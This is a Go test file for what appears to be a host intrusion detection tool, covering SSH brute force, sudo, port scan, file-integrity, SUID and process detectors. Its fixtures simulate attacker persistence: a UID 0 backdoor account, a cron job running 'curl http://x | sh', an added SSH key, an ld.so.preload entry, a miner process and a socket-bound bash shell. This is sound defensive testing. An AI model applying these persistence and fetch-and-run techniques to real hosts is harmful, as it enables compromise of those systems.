package detect

import (
	"encoding/json"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"testing"
	"time"

	"github.com/MrGuato/pisentry/internal/config"
	"github.com/MrGuato/pisentry/internal/engine"
	"github.com/MrGuato/pisentry/internal/event"
	"github.com/MrGuato/pisentry/internal/logsrc"
	"github.com/MrGuato/pisentry/internal/metrics"
	"github.com/MrGuato/pisentry/internal/state"
)

type sink struct {
	mu  sync.Mutex
	evs []event.Event
}

func (s *sink) Emit(e event.Event) {
	s.mu.Lock()
	s.evs = append(s.evs, e)
	s.mu.Unlock()
}

func (s *sink) byCat(c event.Category) []event.Event {
	var out []event.Event
	for _, e := range s.evs {
		if e.Category == c {
			out = append(out, e)
		}
	}
	return out
}

type clock struct{ t time.Time }

func (c *clock) now() time.Time { return c.t }

func newDeps(t *testing.T, mut func(*config.Config)) (Deps, *sink, *clock) {
	t.Helper()
	cfg := config.Defaults()
	cfg.StateDir = t.TempDir()
	cfg.LearningPeriod = config.D(0)
	if mut != nil {
		mut(&cfg)
	}
	st, err := state.Open(cfg.StateDir)
	if err != nil {
		t.Fatal(err)
	}
	s := &sink{}
	c := &clock{t: time.Date(2026, 10, 15, 12, 0, 0, 0, time.UTC)}
	st.Update(func(x *state.State) { x.Created = c.t.Add(-24 * time.Hour) })
	return Deps{Cfg: &cfg, Emit: s, Store: st, M: metrics.NewSet(),
		Log: slog.New(slog.NewTextHandler(io.Discard, nil)), Now: c.now}, s, c
}

func ssh(msg string) logsrc.Line { return logsrc.Line{Ident: "sshd", Msg: msg} }

func TestBruteForceThreshold(t *testing.T) {
	d, s, c := newDeps(t, nil)
	a := NewAuth(d)
	for i := 0; i < 4; i++ {
		a.Handle(ssh("Failed password for root from 203.0.113.7 port 4000" + string(rune('0'+i)) + " ssh2"))
		c.t = c.t.Add(10 * time.Second)
	}
	if n := len(s.byCat(event.SSHBruteForce)); n != 0 {
		t.Fatalf("below threshold emitted %d", n)
	}
	a.Handle(ssh("Failed password for admin from 203.0.113.7 port 40005 ssh2"))
	ev := s.byCat(event.SSHBruteForce)
	if len(ev) != 1 || ev[0].Severity != event.High || ev[0].Fields["src_ip"] != "203.0.113.7" {
		t.Fatalf("got %+v", ev)
	}
	if ev[0].Fields["users"] != "admin,root" {
		t.Errorf("users = %q", ev[0].Fields["users"])
	}
}

func TestBruteForceWindowExpires(t *testing.T) {
	d, s, c := newDeps(t, nil)
	a := NewAuth(d)
	for i := 0; i < 10; i++ {
		a.Handle(ssh("Failed password for pi from 198.51.100.9 port 5000 ssh2"))
		c.t = c.t.Add(2 * time.Minute) // spread past the 5m window
	}
	if n := len(s.byCat(event.SSHBruteForce)); n != 0 {
		t.Fatalf("slow failures should not trip a 5/5m threshold, got %d", n)
	}
}

func TestInvalidUserNotDoubleCounted(t *testing.T) {
	d, s, _ := newDeps(t, nil)
	a := NewAuth(d)
	for i := 0; i < 4; i++ {
		port := string(rune('a' + i))
		a.Handle(ssh("Invalid user oracle from 192.0.2.50 port 1" + port))
		a.Handle(ssh("Failed password for invalid user oracle from 192.0.2.50 port 1" + port + " ssh2"))
	}
	// 4 connections, 1 attempt each = 4 failures, under threshold 5.
	if n := len(s.byCat(event.SSHBruteForce)); n != 0 {
		t.Fatalf("double counted: %d events", n)
	}
}

func TestSuccessAfterFailures(t *testing.T) {
	d, s, c := newDeps(t, nil)
	a := NewAuth(d)
	for i := 0; i < 3; i++ {
		a.Handle(ssh("Failed password for jon from 203.0.113.99 port 1234 ssh2"))
	}
	c.t = c.t.Add(time.Minute)
	a.Handle(ssh("Accepted password for jon from 203.0.113.99 port 1240 ssh2"))
	ev := s.byCat(event.SuspiciousLogin)
	if len(ev) != 1 || ev[0].Severity != event.Critical {
		t.Fatalf("want critical suspicious login, got %+v", ev)
	}
	if !strings.Contains(ev[0].Summary, "after 3 failed") {
		t.Errorf("summary %q", ev[0].Summary)
	}
}

func TestNewSourceLogin(t *testing.T) {
	d, s, _ := newDeps(t, nil)
	a := NewAuth(d)
	a.Handle(ssh("Accepted publickey for jon from 192.168.1.50 port 50000 ssh2: ED25519 SHA256:abc"))
	if ev := s.byCat(event.SuspiciousLogin); len(ev) != 1 || ev[0].Severity != event.Medium {
		t.Fatalf("first login from new source should be medium: %+v", ev)
	}
	s.evs = nil
	a.Handle(ssh("Accepted publickey for jon from 192.168.1.50 port 50001 ssh2"))
	if n := len(s.byCat(event.SuspiciousLogin)); n != 0 {
		t.Fatalf("known source should be quiet, got %d", n)
	}
}

func TestLearningSuppressesNewSource(t *testing.T) {
	d, s, _ := newDeps(t, func(c *config.Config) { c.LearningPeriod = config.D(48 * time.Hour) })
	a := NewAuth(d)
	a.Handle(ssh("Accepted publickey for jon from 192.168.1.50 port 50000 ssh2"))
	if n := len(s.evs); n != 0 {
		t.Fatalf("learning period should suppress, got %d", n)
	}
}

func TestSudo(t *testing.T) {
	d, s, _ := newDeps(t, nil)
	a := NewAuth(d)
	a.Handle(logsrc.Line{Ident: "sudo", Msg: "  mallory : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/mallory ; USER=root ; COMMAND=/bin/bash"})
	a.Handle(logsrc.Line{Ident: "sudo", Msg: "      jon : TTY=pts/0 ; PWD=/home/jon ; USER=root ; COMMAND=/usr/bin/chmod u+s /usr/bin/find"})
	a.Handle(logsrc.Line{Ident: "sudo", Msg: "      jon : TTY=pts/0 ; PWD=/home/jon ; USER=root ; COMMAND=/usr/bin/apt update"})
	ev := s.byCat(event.PrivEsc)
	if len(ev) != 2 {
		t.Fatalf("want 2 privesc events, got %d: %+v", len(ev), ev)
	}
	if ev[0].Severity != event.High || ev[1].Severity != event.Medium {
		t.Errorf("severities %s %s", ev[0].Severity, ev[1].Severity)
	}
}

func TestPortScan(t *testing.T) {
	d, s, c := newDeps(t, nil)
	p := NewPortScan(d)
	for port := 20; port < 31; port++ {
		p.Handle(logsrc.Line{Kernel: true, Ident: "kernel", Msg: "[UFW BLOCK] IN=eth0 OUT= MAC=aa SRC=45.33.32.156 DST=192.168.1.21 LEN=44 TOS=0x00 PREC=0x00 TTL=50 ID=1 PROTO=TCP SPT=61000 DPT=" + itoa(port) + " WINDOW=1024 RES=0x00 SYN URGP=0"})
		c.t = c.t.Add(time.Second)
	}
	if n := len(s.byCat(event.PortScan)); n != 0 {
		t.Fatalf("11 ports should be under threshold 12, got %d", n)
	}
	p.Handle(logsrc.Line{Kernel: true, Msg: "filter_IN_public_REJECT: IN=eth0 SRC=45.33.32.156 DST=192.168.1.21 PROTO=TCP SPT=61000 DPT=8080"})
	ev := s.byCat(event.PortScan)
	if len(ev) != 1 || ev[0].Fields["distinct_ports"] != "12" || ev[0].Fields["proto"] != "TCP" {
		t.Fatalf("got %+v", ev)
	}
}

func itoa(i int) string {
	return strings.TrimSpace(strings.Repeat(" ", 0) + string([]byte{byte('0' + i/10), byte('0' + i%10)}))
}

// ---- FIM ---------------------------------------------------------------

func writeFile(t *testing.T, root, p, content string) {
	t.Helper()
	full := filepath.Join(root, p)
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestFIM(t *testing.T) {
	root := t.TempDir()
	d, s, _ := newDeps(t, func(c *config.Config) { c.HostRoot = root; c.ProcRoot = filepath.Join(root, "proc") })
	writeFile(t, root, "/etc/passwd", "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin\njon:x:1000:1000::/home/jon:/bin/bash\n")
	writeFile(t, root, "/etc/group", "root:x:0:\nsudo:x:27:jon\n")
	writeFile(t, root, "/etc/crontab", "# m h dom mon dow user command\n")
	writeFile(t, root, "/home/jon/.ssh/authorized_keys", "ssh-ed25519 AAAA jon@laptop\n")

	f := NewFIM(d)
	if err := f.Scan(); err != nil {
		t.Fatal(err)
	}
	if len(s.evs) != 0 {
		t.Fatalf("baseline scan must be silent, got %+v", s.evs)
	}

	// Attacker: UID 0 backdoor, www-data shell, sudo group, cron job, ssh key, preload.
	writeFile(t, root, "/etc/passwd", "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33::/var/www:/bin/bash\njon:x:1000:1000::/home/jon:/bin/bash\ntoor:x:0:0::/root:/bin/bash\n")
	writeFile(t, root, "/etc/group", "root:x:0:\nsudo:x:27:jon,www-data\n")
	writeFile(t, root, "/etc/cron.d/updater", "* * * * * root curl http://x | sh\n")
	writeFile(t, root, "/home/jon/.ssh/authorized_keys", "ssh-ed25519 AAAA jon@laptop\nssh-rsa BBBB attacker\n")
	writeFile(t, root, "/etc/ld.so.preload", "/lib/libevil.so\n")
	if err := f.Scan(); err != nil {
		t.Fatal(err)
	}
	want := map[string]event.Severity{
		"Account toor now has UID 0 (root equivalent)":                 event.Critical,
		"Service account www-data was given a login shell (/bin/bash)": event.High,
		"User www-data added to privileged group sudo":                 event.High,
		"/etc/cron.d/updater created":                                  event.High,
		"/home/jon/.ssh/authorized_keys modified":                      event.High,
		"/etc/ld.so.preload created":                                   event.Critical,
	}
	got := map[string]event.Severity{}
	for _, e := range s.evs {
		got[e.Summary] = e.Severity
	}
	for sum, sev := range want {
		if g, ok := got[sum]; !ok || g != sev {
			t.Errorf("missing or wrong severity for %q: got %v (present=%v)", sum, g, ok)
		}
	}
	for _, e := range s.evs {
		if e.Summary == "/home/jon/.ssh/authorized_keys modified" && e.Fields["keys"] != "2" {
			t.Errorf("keys = %s", e.Fields["keys"])
		}
	}

	// Third scan with no changes must be silent: baseline adopted.
	s.evs = nil
	if err := f.Scan(); err != nil {
		t.Fatal(err)
	}
	if len(s.evs) != 0 {
		t.Fatalf("unchanged rescan emitted %+v", s.evs)
	}
}

// Regression: usernames are attacker-controlled. "x from 10.9.9.9 port 1"
// must not let the attacker choose the source IP that gets counted.
func TestUsernameCannotSpoofSourceIP(t *testing.T) {
	d, s, _ := newDeps(t, nil)
	a := NewAuth(d)
	for i := 0; i < 5; i++ {
		fake := "10.9.9." + string(rune('1'+i))
		a.Handle(ssh("Invalid user x from " + fake + " port 1 from 203.0.113.5 port 5000" + string(rune('0'+i))))
	}
	ev := s.byCat(event.SSHBruteForce)
	if len(ev) != 1 || ev[0].Fields["src_ip"] != "203.0.113.5" {
		t.Fatalf("want real source 203.0.113.5 counted, got %+v", ev)
	}
}

func TestForgedSSHDropped(t *testing.T) {
	d, s, _ := newDeps(t, nil)
	a := NewAuth(d)
	for i := 0; i < 10; i++ {
		a.Handle(logsrc.Line{Ident: "sshd", UID: 1000, Msg: "Failed password for root from 203.0.113.7 port 1 ssh2"})
	}
	if len(s.evs) != 0 {
		t.Fatalf("sshd records from uid 1000 are forged and must be ignored")
	}
}

// Regression: a FIFO swapped in for authorized_keys must not hang FIM.
func TestFIMDoesNotBlockOnFIFO(t *testing.T) {
	root := t.TempDir()
	d, _, _ := newDeps(t, func(c *config.Config) { c.HostRoot = root; c.ProcRoot = filepath.Join(root, "proc") })
	writeFile(t, root, "/home/eve/.ssh/authorized_keys", "ssh-ed25519 AAAA eve\n")
	f := NewFIM(d)
	_ = f.Scan()
	p := filepath.Join(root, "/home/eve/.ssh/authorized_keys")
	_ = os.Remove(p)
	if err := syscall.Mkfifo(p, 0o644); err != nil {
		t.Skip("mkfifo unsupported:", err)
	}
	done := make(chan struct{})
	go func() { _ = f.Scan(); close(done) }()
	select {
	case <-done:
	case <-time.After(3 * time.Second):
		t.Fatal("FIM blocked on a FIFO")
	}
}

func TestAllDetectorsEmitSchemaV1(t *testing.T) {
	root := t.TempDir()
	procRoot := filepath.Join(root, "proc")
	d, s, c := newDeps(t, func(cfg *config.Config) {
		cfg.HostRoot = root
		cfg.ProcRoot = procRoot
		cfg.SUID.Paths = []string{"/usr/bin"}
	})
	eng := engine.New(d.Cfg, "pi-sim", d.Store, d.M)
	eng.Now = d.Now
	d.Emit = eng
	eng.AddSink(engine.Sink(sinkAdapter{s}))

	// 1. Auth (PS01, PS02, PS04)
	a := NewAuth(d)
	for i := 0; i < 5; i++ {
		a.Handle(ssh("Failed password for root from 203.0.113.66 port 4100" + string(rune('1'+i)) + " ssh2"))
	}
	a.Handle(ssh("Accepted password for root from 203.0.113.66 port 41999 ssh2"))
	a.Handle(logsrc.Line{Ident: "sudo", Msg: "  mallory : user NOT in sudoers ; TTY=pts/9 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash"})
	a.Handle(logsrc.Line{Ident: "sudo", Msg: "      jon : TTY=pts/0 ; PWD=/home/jon ; USER=root ; COMMAND=/usr/bin/chmod u+s /usr/bin/find"})

	// 2. PortScan (PS09)
	ps := NewPortScan(d)
	for port := 20; port < 35; port++ {
		ps.Handle(logsrc.Line{Kernel: true, Ident: "kernel", Msg: "[UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.23 DST=192.0.2.10 PROTO=TCP SPT=55555 DPT=" + itoa(port) + " SYN"})
	}

	// 3. FIM (PS05, PS10)
	writeFile(t, root, "/etc/passwd", "root:x:0:0:root:/root:/bin/bash\n")
	writeFile(t, root, "/etc/group", "root:x:0:\nsudo:x:27:\n")
	writeFile(t, root, "/etc/crontab", "# base\n")
	fim := NewFIM(d)
	_ = fim.Scan()
	writeFile(t, root, "/etc/cron.d/pisentry-sim", "# sim\n")
	writeFile(t, root, "/etc/ld.so.preload", "/tmp/evil.so\n")
	_ = fim.Scan()

	// 4. SUID (PS04)
	writeFile(t, root, "/usr/bin/passwd", "bin")
	suid := NewSUID(d)
	_ = suid.Scan()
	writeFile(t, root, "/usr/bin/find", "bin")
	_ = os.Chmod(filepath.Join(root, "/usr/bin/find"), 0o755|os.ModeSetuid)
	_ = suid.Scan()

	// 5. Listeners (PS07) & ProcWatch (PS06, PS08) via synthetic /proc
	writeFile(t, procRoot, "/1/net/tcp", "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n"+
		"   0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 100 1 0000000000000000 100 0 0 10 0\n")
	lis := NewListeners(d)
	d.Store.Update(func(st *state.State) { st.Baselines.ListenersSince = c.t.Add(-time.Hour) })
	writeFile(t, procRoot, "/1/net/tcp", "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n"+
		"   0: 00000000:7A69 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 9001 1 0000000000000000 100 0 0 10 0\n"+
		"   1: 0A0200C0:D431 020200C0:115D 01 00000000:00000000 00:00000000 00000000     0        0 9002 1 0000000000000000 20 4 30 10 -1\n")
	writeFile(t, procRoot, "/500/stat", "500 (xmrig) R 1 500 500 0 -1 4194304 100 0 0 0 100 20 0 0 20 0 1 0 12345 1000000 100 18446744073709551615 0 0 0 0 0 0 0 0 0 0 0 0 17 0 0 0 0 0 0\n")
	writeFile(t, procRoot, "/500/cmdline", "xmrig\x00--url=stratum+tcp://pool:3333\x00")
	writeFile(t, procRoot, "/500/status", "Name:\txmrig\nUid:\t0\t0\t0\t0\n")
	_ = os.Symlink("/tmp/xmrig", filepath.Join(procRoot, "500", "exe"))

	writeFile(t, procRoot, "/600/stat", "600 (bash) S 1 600 600 0 -1 4194304 100 0 0 0 10 5 0 0 20 0 1 0 23456 1000000 100 18446744073709551615 0 0 0 0 0 0 0 0 0 0 0 0 17 0 0 0 0 0 0\n")
	writeFile(t, procRoot, "/600/cmdline", "bash\x00-i\x00")
	writeFile(t, procRoot, "/600/status", "Name:\tbash\nUid:\t0\t0\t0\t0\n")
	_ = os.Symlink("/usr/bin/bash", filepath.Join(procRoot, "600", "exe"))
	_ = os.MkdirAll(filepath.Join(procRoot, "600", "fd"), 0o755)
	_ = os.Symlink("socket:[9002]", filepath.Join(procRoot, "600", "fd", "0"))
	_ = os.Symlink(filepath.Join(procRoot, "1", "net"), filepath.Join(procRoot, "600", "net"))

	_ = lis.Scan()
	pw := NewProcWatch(d)
	_ = pw.Scan()

	// 6. Audit (PS03)
	writeFile(t, root, "/etc/ssh/sshd_config", "PermitRootLogin yes\nPasswordAuthentication yes\n")
	ar := NewAuditRunner(d)
	_ = ar.Scan()

	if len(s.evs) < 10 {
		t.Fatalf("expected at least 10 events across detectors, got %d", len(s.evs))
	}
	for i, ev := range s.evs {
		raw, err := json.Marshal(ev)
		if err != nil {
			t.Fatalf("event %d marshal: %v", i, err)
		}
		if err := event.ValidateJSON(raw); err != nil {
			t.Errorf("event %d (%s/%s) failed schema v1 validation: %v\njson: %s", i, ev.Category, ev.Detector, err, raw)
		}
	}
}

type sinkAdapter struct{ s *sink }

func (a sinkAdapter) Handle(e event.Event) { a.s.Emit(e) }

// Found by FuzzAuthHandle: a forged line with an out-of-range port produced
// an event with source.port 100000, which Event Schema v1 rejects.
func TestForgedPortOutOfRange(t *testing.T) {
	if got := parsePort("100000"); got != 0 {
		t.Fatalf("parsePort(100000) = %d, want 0", got)
	}
	if got := parsePort("65535"); got != 65535 {
		t.Fatalf("parsePort(65535) = %d", got)
	}
	d, s, _ := newDeps(t, nil)
	a := NewAuth(d)
	for i := 0; i < 6; i++ {
		a.Handle(ssh("Failed password for root from 203.0.113.66 port 100000 ssh2"))
	}
	evs := s.byCat(event.SSHBruteForce)
	if len(evs) == 0 {
		t.Fatal("no brute-force event")
	}
	for _, ev := range evs {
		if ev.Source.Port != 0 {
			t.Fatalf("source.port = %d, want 0 (dropped)", ev.Source.Port)
		}
	}
}

// Found by FuzzPortScanHandle: in file mode a forged kernel line with a
// non-address SRC and ports above 65535 produced a schema-invalid PS09.
func TestPortScanIgnoresForgedFields(t *testing.T) {
	d, s, c := newDeps(t, nil)
	p := NewPortScan(d)
	for i := 1; i <= 15; i++ {
		for _, msg := range []string{
			"SRC=00000000000000000000000 DST=192.0.2.10 PROTO=TCP DPT=" + itoa(i*10000),
			"SRC=198.51.100.23 DST=192.0.2.10 PROTO=TCP DPT=" + itoa(65535+i),
		} {
			p.Handle(logsrc.Line{Kernel: true, Ident: "kernel", Msg: msg})
		}
		c.t = c.t.Add(time.Second)
	}
	if evs := s.byCat(event.PortScan); len(evs) != 0 {
		t.Fatalf("forged lines raised %d port-scan events: %+v", len(evs), evs[0])
	}
}
